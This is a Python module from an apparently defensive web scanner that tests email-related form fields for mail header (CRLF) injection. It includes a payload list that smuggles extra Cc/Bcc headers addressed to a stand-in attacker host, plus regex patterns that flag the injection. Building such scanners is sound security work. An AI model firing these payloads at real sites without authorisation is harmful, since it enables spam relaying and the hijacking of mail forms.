"""
Mail Header Injection Scanner
Detects CRLF injection in email-related form fields (IPA: 1.8 メールヘッダ・インジェクション).

Detection strategy:
  1. Target only fields whose names suggest they feed into email headers
     (email, to, from, cc, bcc, subject, reply_to, …).
  2. Inject CRLF sequences that would add extra headers if unescaped.
  3. Flag when the server:
       a. Reflects the raw CRLF in its HTML response (injection not sanitised), OR
       b. Returns mail-related error messages leaking the injection.
  Note: confirming the injection actually reached an outbound email is out of scope
  for a browser-based scanner; this check is inherently heuristic.
"""
import asyncio
import re
from typing import TYPE_CHECKING

from .base import BaseScanner, Finding

if TYPE_CHECKING:
    from wscan.engine import ScanEngine


# Field name substrings that suggest the value is used in a mail header
MAIL_FIELD_HINTS = {
    "email", "mail", "e-mail", "e_mail",
    "to", "from", "cc", "bcc",
    "subject", "reply_to", "replyto", "reply-to",
    "sender", "recipient",
}

# Injection payloads — each embeds CRLF variants to split headers
MAIL_INJECTION_PAYLOADS = [
    "test@example.com\r\nCc: attacker@evil.example.com",
    "test@example.com\nCc: attacker@evil.example.com",
    "test@example.com%0aCc: attacker@evil.example.com",
    "test@example.com%0d%0aCc: attacker@evil.example.com",
    "test@example.com\r\nBcc: attacker@evil.example.com",
    # Subject-oriented injection
    "Hello\r\nCc: attacker@evil.example.com",
    "Hello%0d%0aCc: attacker@evil.example.com",
]

# Response patterns that suggest mail-construction error leakage
MAIL_ERROR_PATTERNS = [
    r"mail\(\)\s*failed",
    r"sendmail.*error",
    r"SMTP\s+error",
    r"could not send.*mail",
    r"failed to send.*mail",
    r"invalid.*mail\s+header",
    r"header.*injection",
]

# Compiled pattern to detect raw CRLF + injected Cc/Bcc reflected in the response body
_REFLECTED_INJECTION_RE = re.compile(
    r"(?:\r\n|\n)\s*(?:Cc|Bcc|To|From):\s*attacker", re.IGNORECASE
)


class MailHeaderInjectionScanner(BaseScanner):
    """Mail header injection scanner targeting email-related form fields (IPA 1.8)."""

    CHECK_TYPE = "mail_header"
    SEVERITY = "high"

    async def scan_field(
        self,
        url: str,
        form_index: int,
        field: dict,
        is_url_param: bool = False,
    ) -> list[Finding]:
        field_name = field.get("name", "unknown")

        # Only test fields whose names suggest email header usage
        name_lower = field_name.lower().replace("-", "_").replace(" ", "_")
        if not any(hint in name_lower for hint in MAIL_FIELD_HINTS):
            return []

        findings = []

        if self.monitor:
            await self.monitor.emit_status(
                f"Mail header injection testing: {field_name} on {url}"
            )

        for payload in MAIL_INJECTION_PAYLOADS:
            if self.monitor:
                await self.monitor.emit_payload_test(field_name, payload, "mail_header")

            source, pair = await self._apply_payload(
                url, form_index, field_name, payload, is_url_param
            )
            await asyncio.sleep(0.2 * self.sleep_factor)

            # Check 1: mail-related error message in response (leaks unsanitised input)
            match = self.check_response_for_patterns(source, MAIL_ERROR_PATTERNS)
            if match:
                finding = await self.record_finding(
                    url=url,
                    field_name=field_name,
                    payload=payload,
                    evidence=(
                        f"Possible mail header injection — mail error in response: '{match}'"
                    ),
                    pair=pair,
                    severity="high",
                )
                findings.append(finding)
                break

            # Check 2: raw CRLF + injected header reflected verbatim in HTML body
            if _REFLECTED_INJECTION_RE.search(source):
                finding = await self.record_finding(
                    url=url,
                    field_name=field_name,
                    payload=payload,
                    evidence=(
                        "Mail header injection: injected CRLF + Cc/Bcc header "
                        "reflected unescaped in the HTTP response body"
                    ),
                    pair=pair,
                    severity="high",
                )
                findings.append(finding)
                break

        return findings

    async def _apply_payload(
        self,
        url: str,
        form_index: int,
        field_name: str,
        payload: str,
        is_url_param: bool,
    ) -> tuple[str, dict]:
        try:
            if is_url_param:
                return await self.browser.test_url_param(url, field_name, payload)
            else:
                await self.browser.navigate(url)
                return await self.browser.fill_and_submit_form(
                    form_index, field_name, payload
                )
        except Exception:
            return "", {}
